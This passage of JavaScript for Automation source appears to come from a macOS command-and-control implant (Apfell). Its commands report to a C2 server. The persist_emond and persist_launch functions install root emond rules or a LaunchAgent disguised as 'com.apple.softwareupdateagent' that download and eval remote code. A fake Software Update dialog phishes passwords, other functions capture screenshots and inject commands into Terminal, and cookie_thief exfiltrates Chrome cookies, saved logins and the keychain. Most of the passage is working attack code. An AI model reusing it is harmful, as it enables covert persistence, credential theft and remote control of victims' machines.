    }
};

exports.iTerm = function(task, command, params){
    try{
        let term = Application("iTerm");
        if(!term.running()){
            term = Application("iTerm2");  // it might be iTerm2 instead of iTerm in some instances, try both
        }
        let output = {};
        if(term.running()){
            for(let i = 0; i < term.windows.length; i++){
                let window = {};
                for(let j = 0; j < term.windows[i].tabs.length; j++){
                    let tab_info = {};
                    tab_info['tty'] = term.windows[i].tabs[j].currentSession.tty();
                    tab_info['name'] = term.windows[i].tabs[j].currentSession.name();
                    tab_info['contents'] = term.windows[i].tabs[j].currentSession.contents();
                    tab_info['profileName'] = term.windows[i].tabs[j].currentSession.profileName();
                    window["Tab: " + j] = tab_info;
                }
                output["Window: " + i] = window;
            }
            return {"user_output":JSON.stringify(output, null, 2), "completed": true};
        }
        else{
            return {"user_output":"iTerm isn't running", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.persist_emond = function(task, command, params){
    try{
        //emond persistence from https://www.xorrior.com/emond-persistence/
        let config = JSON.parse(params);
        // read "/System/Library/LaunchDaemons/com.apple.emond.plist" for the "QueueDirectories" key (returns array)
        // create ".DS_Store" file there that's empty
        // create new plist in "/etc/emond.d/rules/"
        let rule_name = "update_files";
        if(config.hasOwnProperty('rule_name') && config['rule_name'] !== ""){rule_name = config['rule_name'];}
        let payload_type = "oneliner-jxa";
        if(config.hasOwnProperty('payload_type') && config['payload_type'] !== ""){payload_type = config['payload_type'];}
        if(payload_type === "oneliner-jxa"){
            if(config.hasOwnProperty('url') && config['url'] !== ""){var url = config['url'];}
            else{ return "URL is required for the oneliner-jxa payload_type"; }
            let internal_command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
            url + "')),$.NSUTF8StringEncoding)))";
            // now we need to base64 encode our command
            var command_data = $(internal_command).dataUsingEncoding($.NSUTF16StringEncoding);
            var base64_command = command_data.base64EncodedStringWithOptions(0).js;
            var full_command = "echo \"" + base64_command + "\" | base64 -D | /usr/bin/osascript -l JavaScript &amp;";
        }
        else if(payload_type === "custom_bash-c"){
            if(config.hasOwnProperty('command') && config['command'] !== ""){var full_command = config['command'];}
            else{
            return {"user_output":"command is a required field for the custom_bash-c payload_type", "completed": true, "status": "error"};
            }
        }
        // get our new plist file_name
        if(config.hasOwnProperty('file_name') && config['file_name'] !== ""){ var file_name = config['file_name'];}
        else{ return {"user_output":"file name is required", "completed": true, "status": "error"}; }

        var plist_contents = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
    "<plist version=\"1.0\">\n" +
    "<array>\n" +
    "	<dict>\n" +
    "		<key>name</key>\n" +
    "		<string>" + rule_name + "</string>\n" +
    "		<key>enabled</key>\n" +
    "		<true/>\n" +
    "		<key>eventTypes</key>\n" +
    "		<array>\n" +
    "			<string>startup</string>\n" +
    "		</array>\n" +
    "		<key>actions</key>\n" +
    "		<array>\n" +
    "			<dict>\n" +
    "				<key>command</key>\n" +
    "				<string>/bin/sleep</string>\n" +
    "				<key>user</key>\n" +
    "				<string>root</string>\n" +
    "				<key>arguments</key>\n" +
    "				<array>\n" +
    "					<string>60</string>\n" +
    "				</array>\n" +
    "				<key>type</key>\n" +
    "				<string>RunCommand</string>\n" +
    "			</dict>\n" +
    "			<dict>\n" +
    "				<key>command</key>\n" +
    "				<string>/bin/bash</string>\n" +
    "				<key>user</key>\n" +
    "				<string>root</string>\n" +
    "				<key>arguments</key>\n" +
    "				<array>\n" +
    "					<string>-c</string>\n" +
    "					<string> " + full_command + "</string>\n" +
    "				</array>\n" +
    "				<key>type</key>\n" +
    "				<string>RunCommand</string>\n" +
    "			</dict>\n" +
    "		</array>\n" +
    "	</dict>\n" +
    "</array>\n" +
    "</plist>";
        // read the plist file and check the QueueDirectories field
        var prefs = ObjC.deepUnwrap($.NSMutableDictionary.alloc.initWithContentsOfFile($("/System/Library/LaunchDaemons/com.apple.emond.plist")));
        //console.log(JSON.stringify(prefs));
        var queueDirectories = prefs['QueueDirectories'];
        if(queueDirectories !== undefined && queueDirectories.length > 0){
            var queueDirectoryPath = queueDirectories[0];
            write_data_to_file(" ", queueDirectoryPath + "/.DS_Store");
            // now that we have a file in our queueDirectory, we need to write out our plist
            write_data_to_file(plist_contents, "/etc/emond.d/rules/" + file_name);

            var user_output = "Created " + queueDirectoryPath + "/.DS_Store and /etc/emond.d/rules/" + file_name + " with contents: \n" + plist_contents;

            // announce our created artifacts and user output
            return {'user_output': user_output, 'artifacts': [{'base_artifact': 'File Create', 'artifact': queueDirectoryPath + "/.DS_Store"}, {'base_artifact': 'File Create', 'artifact': '/etc/emond.d/rules/' + file_name}], "completed": true};
          }
        else{
            return {"user_output":"QueueDirectories array is either not there or 0 in length", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.terminals_send = function(task, command, params){
    let split_params = {"window": 0, "tab": 0, "command": ""};
    try{
        split_params = Object.assign({}, split_params, JSON.parse(params));
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
	let output = "No Command Output";
	try{
		let term = Application("Terminal");
		if(term.running()){
            let window = split_params['window'];
            let tab = split_params['tab'];
            let cmd = split_params['command'];
            term.doScript(cmd, {in:term.windows[window].tabs[tab]});
            output = term.windows[window].tabs[tab].contents();
        }else{
            return {"user_output":"Terminal is not running", "completed": true, "status": "error"};
        }
	}
	catch(error){
		return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
	return {"user_output":output, "completed": true};
};

exports.exit = function(task, command, params){
    ObjC.import("AppKit");
    C2.postResponse(task, {"completed": true, "user_output": "Exiting"});
    $.NSApplication.sharedApplication.terminate($.nil);
    $.NSThread.exit();
};

exports.screenshot = function(task, command, params){
    try{
        ObjC.import('Cocoa');
        ObjC.import('AppKit');
        let cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
        if(cgimage.js === undefined) {
            cgimage = $.CFMakeCollectable(cgimage); // in case 10.15 is messing with the types again
        }
        if(cgimage.js === undefined){
          return {"user_output":"Failed to get image from display", "completed": true, "status": "error"};
        }
        let bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
        let capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
        let offset = 0;
        let chunkSize = 350000;
        let fileSize = parseInt(capture.length);
        // always round up to account for chunks that are < chunksize;
        let numOfChunks = Math.ceil(fileSize / chunkSize);
        let registerData = {'total_chunks': numOfChunks, 'task': task.id, "is_screenshot": true};
        let registerFile = C2.postResponse(task, registerData);
        if (registerFile['responses'][0]['status'] === "success"){
            let currentChunk = 1;
            let csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
            let data = capture.subdataWithRange($.NSMakeRange(offset, csize));
            while(parseInt(data.length) > 0 && offset < fileSize){
                // send a chunk
                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['responses'][0]['file_id']};
                C2.postResponse(task, fileData);
                $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());

                // increment the offset and seek to the amount of data read from the file
                offset = offset + parseInt(data.length);
                csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
                data = capture.subdataWithRange($.NSMakeRange(offset, csize));
                currentChunk += 1;
            }
            return {"user_output":JSON.stringify({"file_id": registerFile['responses'][0]['file_id']}), "completed": true};
        }
        else{
            return {"user_output":"Failed to register file to download", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":"Failed to get a screencapture: " + error.toString(), "completed": true, "status": "error"};
    }
};

exports.sleep = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        if(command_params.hasOwnProperty('interval') && command_params["interval"] && command_params['interval'] >= 0){
            C2.interval = command_params['interval'];
        }
        if(command_params.hasOwnProperty('jitter') && command_params["jitter"] && command_params['jitter'] >= 0 && command_params['jitter'] <= 100){
            C2.jitter = command_params['jitter'];
        }
        let sleep_response = "Sleep interval updated to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
        return {"user_output":sleep_response, "completed": true, "process_response": sleep_response};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};


exports.prompt = function(task, command, params){
    let config = [];
	if(params.length > 0){config = JSON.parse(params);}
	else{config = [];}
	let title = "Application Needs to Update";
	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
	let icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
	let text = "An application needs permission to update";
	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
	let answer = "";
	if(config.hasOwnProperty("answer") && config['answer'] !== ""){answer = config['answer'];}
	try{

		let cbID = currentApp.systemAttribute('__CFBundleIdentifier').toString()
		let contextApp = Application(cbID)
		contextApp.includeStandardAdditions = true;
		let prompt = contextApp.displayDialog(text, {
			defaultAnswer: answer,
			buttons: ['OK', 'Cancel'], 
			defaultButton: 'OK',
			cancelButton: 'Cancel', 
			withTitle: title,  
			withIcon: Path(icon),
			hiddenAnswer: true 
		});
		return {"user_output":prompt.textReturned, "completed": true};
	}catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
};

exports.cat = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        if(!command_params.hasOwnProperty('path')){return {"user_output": "Missing path parameter", "completed": true, "status": "error"}}
        let contents = $.NSString.stringWithContentsOfFileEncodingError($(command_params['path']), $.NSUTF8StringEncoding, $()).js;
        if(contents === ""){
            return {"user_output": "No output from command", "completed": true};
        }
        else if(contents === true){
            return {"user_output": "True", "completed": true};
        }
        else if(contents === false){
            return{"user_output": "False", "completed": true};
        }
        else if(contents === undefined){
            return {"user_output": "Failed to read file. Either you don't have permissions or the file doesn't exist", "completed": true, "status": "error"};
        }
        return {"user_output": contents, "completed": true};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};

exports.test_password = function(task, command, params){
    ObjC.import("OpenDirectory");
    let session = $.ODSession.defaultSession;
    let sessionType = 0x2201 // $.kODNodeTypeAuthentication
    let recType = $.kODRecordTypeUsers 
    let node = $.ODNode.nodeWithSessionTypeError(session, sessionType, $());
    let username = apfell.user;
    let password = "";
    if(params.length > 0){
        let data = JSON.parse(params);
        if(data.hasOwnProperty('username') && data['username'] !== ""){
            username = data['username'];
        }
        if(data.hasOwnProperty('password') && data['password'] !== ""){
            password = data['password'];
        }
        // if no password is supplied, try an empty password
    }
    let user = node.recordWithRecordTypeNameAttributesError(recType,$(username), $(), $())
    if(user.js !== undefined){
        if(user.verifyPasswordError($(password),$())){
            return {"user_output":"Successful authentication", "completed": true};
        }
        else{
            return {"user_output":"Failed authentication", "completed": true};
        }
    }
    else{
        return {"user_output":"User does not exist", "completed": true, "status": "error"};
    }
};

exports.pwd = function(task, command, params){
    try{
        let fileManager = $.NSFileManager.defaultManager;
        let cwd = fileManager.currentDirectoryPath;
        if(cwd === undefined || cwd === ""){
            return {"user_output":"CWD is empty or undefined", "completed": true, "status": "error"};
        }
        return {"user_output":cwd.js, "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.jsimport = function(task,command,params){
    let script = "";
    try{
        let config = JSON.parse(params);
        let old_script_exists = jsimport === "";
        if(config.hasOwnProperty("file")){
            let script_data = C2.upload(task, config['file']);
            if(typeof script_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            script = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding));
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        jsimport = script;
        if(old_script_exists){
            return {"user_output":"Cleared old script and imported the new script", "completed": true};
        }else{
            return {"user_output":"Imported the script", "completed": true};
        }

    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.list_entitlements = function(task, command, params){
    ObjC.import('AppKit');
    let le = function(pid){
        ObjC.bindFunction('malloc', ['void**', ['int']]);
        ObjC.bindFunction('csops', ['int', ['int', 'int', 'void *', 'int'] ]);
        let output = $.malloc(512000);
        $.csops(pid, 7, output, 512000);
        let data = $.NSData.alloc.initWithBytesLength(output, 512000);
        for(let i = 8; i < data.length; i ++){
            if(data.bytes[i] === 0){
                let range = $.NSMakeRange(8, i);
                data = data.subdataWithRange(range);
                let plist = $.NSPropertyListSerialization.propertyListWithDataOptionsFormatError(data, $.NSPropertyListImmutable, $.nil, $());
                return ObjC.deepUnwrap(plist);
            }
        }
        return {};
    }
    try{
        let arguments = JSON.parse(params);
        let output = [];
        if(arguments["pid"] === -1){
            let procs = $.NSWorkspace.sharedWorkspace.runningApplications.js;
            for(let i = 0; i < procs.length; i++){
                let entitlements = {};
                let ent = le(procs[i].processIdentifier);
                if(ent === null || ent === undefined){
                	ent = {};
                }
                entitlements["pid"] = procs[i].processIdentifier;
                entitlements['bundle'] = procs[i].bundleIdentifier.js;
            	entitlements['bundleURL'] = procs[i].bundleURL.path.js;
            	entitlements['bin_path'] = procs[i].executableURL.path.js;
            	entitlements['name'] = procs[i].localizedName.js;
            	entitlements["entitlements"] = ent;
                output.push(entitlements);
            }
        }else {
            let entitlements = {};
            let ent = le(arguments["pid"]);
            entitlements["pid"] = arguments["pid"];
            entitlements['bundle'] = "";
            entitlements['bundleURL'] = "";
            entitlements['bin_path'] = "";
            entitlements['name'] = "";
            entitlements["entitlements"] = ent;
            output.push(entitlements);
        }
        return {"user_output":JSON.stringify(output, null, 2), "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.list_apps = function(task, command, params){
    ObjC.import('AppKit');
    try{
        let names = [];
        let procs = $.NSWorkspace.sharedWorkspace.runningApplications.js;
        for(let i = 0; i < procs.length; i++){
            let info = {};
            info['frontMost'] = procs[i].active;
            info['hidden'] = procs[i].hidden;
            info['bundle'] = procs[i].bundleIdentifier.js;
            info['bundleURL'] = procs[i].bundleURL.path.js;
            info['bin_path'] = procs[i].executableURL.path.js;
            info['process_id'] = procs[i].processIdentifier;
            info['name'] = procs[i].localizedName.js;
            if(procs[i].executableArchitecture === "16777223"){
                info['architecture'] = "x64";
            }
            else if(procs[i].executableArchitecture === "7"){
                info['architecture'] = "x86";
            }
            else if(procs[i].executableArchitecture === "18"){
                info['architecture'] = "x86_PPC";
            }
            else if(procs[i].executableArchitecture === "16777234"){
                info['architecture'] = "x86_64_PPC";
            }
            else {
                info['architecture'] = procs[i].executableArchitecture;
            }
            names.push(info);
        }
        return {"user_output":JSON.stringify(names, null, 2), "processes": names, "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.plist = function(task, command, params){
    try{
        let config = JSON.parse(params);
        ObjC.import('Foundation');
        let output = [];
        try{
            if(config['type'] === "read"){
                output = [];
                let filename = $.NSString.alloc.initWithUTF8String(config['filename']);
                let prefs = $.NSMutableDictionary.alloc.initWithContentsOfFile(filename);
                let contents = ObjC.deepUnwrap(prefs);
                let fileManager = $.NSFileManager.defaultManager;
                let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(config['filename']), $()));
                let nsposix = {};
                let posix = "";
                if(plistPerms !== undefined){
                    nsposix = plistPerms['NSFilePosixPermissions'].js;
                    posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                    if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                        let extended = {};
                        let perms = plistPerms['NSFileExtendedAttributes'].js;
                        for(let j in perms){
                            extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                        }
                        contents['PlistPermissionsExtendedAttributes'] = extended;
                    }
                }
                // we need to fix this mess to actually be real permission bits that make sense
                contents['PlistPermissions'] = posix;
                output.push(contents);
            }
            else if(config['type'] === "readLaunchAgents"){
                output = {};
                let fileManager = $.NSFileManager.defaultManager;
                let error = Ref();
                let path = fileManager.homeDirectoryForCurrentUser.fileSystemRepresentation + "/Library/LaunchAgents/";
                let files = fileManager.contentsOfDirectoryAtPathError($(path), error);
                try{
                    // no errors, so now iterate over the files
                    files = ObjC.deepUnwrap(files);
                    output["localLaunchAgents"] = {};
                    for(let i in files){
                        let prefs = $.NSMutableDictionary.alloc.initWithContentsOfFile(path + files[i]);
                        let contents = ObjC.deepUnwrap(prefs);
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + files[i]), $()));
                        let nsposix = {};
                        let posix = "";
                        if(plistPerms !== undefined){
                            nsposix = plistPerms['NSFilePosixPermissions'].js;
                            posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                            if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                                let extended = {};
                                let perms = plistPerms['NSFileExtendedAttributes'].js;
                                for(let j in perms){
                                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                                }
                                contents['PlistPermissionsExtendedAttributes'] = extended;
                            }
                        }
                        // we need to fix this mess to actually be real permission bits that make sense
                        contents['PlistPermissions'] = posix;
                        output["localLaunchAgents"][files[i]] = {};
                        output["localLaunchAgents"][files[i]]['contents'] = contents;
                        if(contents !== undefined && contents.hasOwnProperty("ProgramArguments")){
                            //now try to get the attributes of the program this plist points to since it might have attribute issues for abuse
                            let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(contents['ProgramArguments'][0]), $()));
                            if(attributes !== undefined){
                                let trimmed_attributes = {};
                                trimmed_attributes['NSFileOwnerAccountID'] = attributes['NSFileOwnerAccountID'];
                                trimmed_attributes['NSFileExtensionHidden'] = attributes['NSFileExtensionHidden'];
                                trimmed_attributes['NSFileGroupOwnerAccountID'] = attributes['NSFileGroupOwnerAccountID'];
                                trimmed_attributes['NSFileOwnerAccountName'] = attributes['NSFileOwnerAccountName'];
                                trimmed_attributes['NSFileCreationDate'] = attributes['NSFileCreationDate'];
                                nsposix = attributes['NSFilePosixPermissions'];
                                // we need to fix this mess to actually be real permission bits that make sense
                                posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                                trimmed_attributes['NSFilePosixPermissions'] = posix;
                                trimmed_attributes['NSFileGroupOwnerAccountName'] = attributes['NSFileGroupOwnerAccountName'];
                                trimmed_attributes['NSFileModificationDate'] = attributes['NSFileModificationDate'];
                                output["localLaunchAgents"][files[i]]['ProgramAttributes'] = trimmed_attributes;
                            }
                        }
                    }
                }catch(error){
                    return {"user_output":"Error trying to read ~/Library/LaunchAgents: " + error.toString(), "completed": true, "status": "error"};
                }
                path = "/Library/LaunchAgents/";
                files = fileManager.contentsOfDirectoryAtPathError($(path), error);
                try{
                    // no errors, so now iterate over the files
                    files = ObjC.deepUnwrap(files);
                    output["systemLaunchAgents"] = {};
                    for(let i in files){
                        let prefs = $.NSMutableDictionary.alloc.initWithContentsOfFile(path + files[i]);
                        let contents = ObjC.deepUnwrap(prefs);
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + files[i]), $()));
                        let nsposix = {};
                        let posix = "";
                        if(plistPerms !== undefined){
                            nsposix = plistPerms['NSFilePosixPermissions'].js;
                            posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                            if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                                let extended = {};
                                let perms = plistPerms['NSFileExtendedAttributes'].js;
                                for(let j in perms){
                                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                                }
                                contents['PlistPermissionsExtendedAttributes'] = extended;
                            }
                        }
                        // we need to fix this mess to actually be real permission bits that make sense
                        contents['PlistPermissions'] = posix;
                        output['systemLaunchAgents'][files[i]] = {};
                        output["systemLaunchAgents"][files[i]]['contents'] = contents;
                        if(contents !== undefined && contents.hasOwnProperty("ProgramArguments")){
                            let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(contents['ProgramArguments'][0]), $()));
                            if(attributes !== undefined){
                                let trimmed_attributes = {};
                                trimmed_attributes['NSFileOwnerAccountID'] = attributes['NSFileOwnerAccountID'];
                                trimmed_attributes['NSFileExtensionHidden'] = attributes['NSFileExtensionHidden'];
                                trimmed_attributes['NSFileGroupOwnerAccountID'] = attributes['NSFileGroupOwnerAccountID'];
                                trimmed_attributes['NSFileOwnerAccountName'] = attributes['NSFileOwnerAccountName'];
                                trimmed_attributes['NSFileCreationDate'] = attributes['NSFileCreationDate'];
                                let nsposix = attributes['NSFilePosixPermissions'];
                                // we need to fix this mess to actually be real permission bits that make sense
                                trimmed_attributes['NSFilePosixPermissions'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();;
                                trimmed_attributes['NSFileGroupOwnerAccountName'] = attributes['NSFileGroupOwnerAccountName'];
                                trimmed_attributes['NSFileModificationDate'] = attributes['NSFileModificationDate'];
                                output["systemLaunchAgents"][files[i]]['ProgramAttributes'] = trimmed_attributes;
                            }
                        }
                    }
                }
                catch(error){
                    return {"user_output":"Error trying to read /Library/LaunchAgents: " + error.toString(), "completed": true, "status": "error"};
                }
            }
            else if(config['type'] === "readLaunchDaemons"){
                let fileManager = $.NSFileManager.defaultManager;
                let path = "/Library/LaunchDaemons/";
                let error = Ref();
                output = {};
                let files = fileManager.contentsOfDirectoryAtPathError($(path), error);
                try{
                    // no errors, so now iterate over the files
                    files = ObjC.deepUnwrap(files);
                    output["systemLaunchDaemons"] = {};
                    for(let i in files){
                        let prefs = $.NSMutableDictionary.alloc.initWithContentsOfFile(path + files[i]);
                        let contents = ObjC.deepUnwrap(prefs);
                        if(contents === undefined){ contents = {};}
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + files[i]), $()));
                        let nsposix = {};
                        let posix = "";
                        if(plistPerms !== undefined){
                            nsposix = plistPerms['NSFilePosixPermissions'].js;
                            posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                            if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                                let extended = {};
                                let perms = plistPerms['NSFileExtendedAttributes'].js;
                                for(let j in perms){
                                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                                }
                                contents['PlistPermissionsExtendedAttributes'] = extended;
                            }
                        }
                        // we need to fix this mess to actually be real permission bits that make sense
                        contents['PlistPermissions'] = posix;
                        output['systemLaunchDaemons'][files[i]] = {};
                        output["systemLaunchDaemons"][files[i]]['contents'] = contents;
                        if(contents !== undefined && contents.hasOwnProperty('ProgramArguments')){
                            let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(contents['ProgramArguments'][0]), $()));
                            if(attributes !== undefined){
                                let trimmed_attributes = {};
                                trimmed_attributes['NSFileOwnerAccountID'] = attributes['NSFileOwnerAccountID'];
                                trimmed_attributes['NSFileExtensionHidden'] = attributes['NSFileExtensionHidden'];
                                trimmed_attributes['NSFileGroupOwnerAccountID'] = attributes['NSFileGroupOwnerAccountID'];
                                trimmed_attributes['NSFileOwnerAccountName'] = attributes['NSFileOwnerAccountName'];
                                trimmed_attributes['NSFileCreationDate'] = attributes['NSFileCreationDate'];
                                nsposix = attributes['NSFilePosixPermissions'];
                                // we need to fix this mess to actually be real permission bits that make sense
                                posix = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                                trimmed_attributes['NSFilePosixPermissions'] = posix;
                                trimmed_attributes['NSFileGroupOwnerAccountName'] = attributes['NSFileGroupOwnerAccountName'];
                                trimmed_attributes['NSFileModificationDate'] = attributes['NSFileModificationDate'];
                                output["systemLaunchDaemons"][files[i]]['ProgramAttributes'] = trimmed_attributes;
                            }
                        }
                    }
                }
                catch(error){
                    return {"user_output":"Failed to read launch daemons: " + error.toString(), "completed": true, "status": "error"};
                }
            }
            return {"user_output":JSON.stringify(output, null, 2), "completed": true};
        }catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};


exports.persist_launch = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let template = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
                "<plist version=\"1.0\">\n" +
                "<dict>\n" +
                "<key>Label</key>\n";
        let label = "com.apple.softwareupdateagent";
        if(config.hasOwnProperty('label') && config['label'] !== ""){label = config['label'];}
        template += "<string>" + label + "</string>\n";
        template += "<key>ProgramArguments</key><array>\n";
        if(config.hasOwnProperty('args') && config['args'].length > 0){
            if(config['args'][0] === "apfell-jxa"){
                // we'll add in an apfell-jxa one liner to run
                template += "<string>/usr/bin/osascript</string>\n" +
                "<string>-l</string>\n" +
                "<string>JavaScript</string>\n" +
                "<string>-e</string>\n" +
                "<string>eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
                config['args'][1] + "')),$.NSUTF8StringEncoding)))</string>\n"
            }
            else{
                for(let i = 0; i < config['args'].length; i++){
                    template += "<string>" + config['args'][i] + "</string>\n";
                }
            }
        }
        else{
            return {"user_output": "Program args needs values for \"apfell-jxa\"", "completed": true, "status": "error"};
        }
        template += "</array>\n";
        if(config.hasOwnProperty('KeepAlive') && config['KeepAlive'] === true){ template += "<key>KeepAlive</key>\n<true/>\n"; }
        if(config.hasOwnProperty('RunAtLoad') && config['RunAtLoad'] === true){ template += "<key>RunAtLoad</key>\n<true/>\n"; }
        template += "</dict>\n</plist>\n"
        // now we need to actually write out the plist to disk
        let response = "";
        if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] === true){
            let path = "~/Library/LaunchAgents/";
            path = $(path).stringByExpandingTildeInPath;
            var fileManager = $.NSFileManager.defaultManager;
            if(!fileManager.fileExistsAtPath(path)){
                $.fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(), $());
            }
            path = $(path.js + "/" + label + ".plist");
            response = write_data_to_file(template, path) + " to " + ObjC.deepUnwrap(path);
            let artifacts = {'user_output': response, 'artifacts': [{'base_artifact': 'File Create', 'artifact': ObjC.deepUnwrap(path)}], "completed": true};
            return artifacts
        }
        else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] !== ""){
            response = write_data_to_file(template, $(config['LaunchPath'])) + " to " + config["LaunchPath"];
            let artifacts = {'user_output': response, 'artifacts': [{'base_artifact': 'File Create', 'artifact': config["LaunchPath"]}], "completed": true};
            return artifacts
        }
        return artifacts

    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.terminals_read = function(task, command, params){
    let split_params = {};
    try{
        split_params = JSON.parse(params);
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
	let all_data = {};
	try{
		let term = Application("Terminal");
		if(term.running()){
            let windows = term.windows;
            for(let i = 0; i < windows.length; i++){
                let win_info = {
                    "Name": windows[i].name(),
                    "Visible": windows[i].visible(),
                    "Frontmost": windows[i].frontmost(),
                    "tabs": []
                };
                let all_tabs = [];
                // store the windows information in id_win in all_data
                all_data["window_" + i] = win_info;
                for(let j = 0; j < windows[i].tabs.length; j++){
                    let tab_info = {
                        "tab": j,
                        "Busy": windows[i].tabs[j].busy(),
                        "Processes": windows[i].tabs[j].processes(),
                        "Selected": windows[i].tabs[j].selected(),
                        "TTY": windows[i].tabs[j].tty()
                    };
                    if(windows[i].tabs[j].titleDisplaysCustomTitle()){
                        tab_info["CustomTitle"] =  windows[i].tabs[j].customTitle();
                    }
                    if(split_params['level'] === 'history'){
                        tab_info["History"] = windows[i].tabs[j].history();
                    }
                    if(split_params['level'] === 'contents'){
                        tab_info["Contents"] = windows[i].tabs[j].contents();
                    }
                    all_tabs.push(tab_info);
                }
                // store all of the tab information corresponding to that window id at id_tabs
                win_info['tabs'] = all_tabs;
            }
        }else{
            return {"user_output":"Terminal is not running", "completed": true, "status": "error"};
        }

	}catch(error){
	    return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
	let output = JSON.stringify(all_data, null, 2);
	return {"user_output":output, "completed": true};
};

exports.cookie_thief = function(task, command, params){
    let config = JSON.parse(params);
    let keyDL_status = {};
    let username = "";
    let browser = "chrome";
    let homedir = "/Users/";
    let keychainpath = "/Library/Keychains/login.keychain-db";
    let chromeCookieDir = "/Library/Application Support/Google/Chrome/Default/Cookies";
    let cookiedir = "/Library/Application Support/Google/Chrome/Default/Cookies";
    let logindir = "/Library/Application Support/Google/Chrome/Default/Login Data";

    if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
        username = config['username'];
    }
    else {
        return {'user_output': "Must supply the username", "completed": true, "status": "error"};
    }
    let cookiepath = homedir + username;

    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){
      browser = config['browser'];
    }

    if(browser === "chrome") {
        cookiedir = chromeCookieDir;
    }
    let cookieDLPath = cookiepath + cookiedir;
    let loginDLPath = cookiepath + logindir;

    try{
        let status = C2.download(task, cookieDLPath);
        if(!status.hasOwnProperty("file_id")){
            return status;
        }
    }
    catch(error)  {
